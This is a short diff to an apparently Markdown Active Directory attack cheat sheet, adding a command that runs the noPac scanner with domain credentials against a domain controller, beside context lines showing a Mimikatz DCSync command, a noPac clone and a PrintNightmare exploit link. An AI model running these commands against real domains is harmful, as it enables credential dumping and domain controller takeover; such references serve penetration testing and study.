@@ -472,6 +472,10 @@ lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /
 git clone https://github.com/Ridter/noPac.git
 ```
 
+```shell
+sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <domain controller> -use-ldap
+```
+
 - [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
 
 
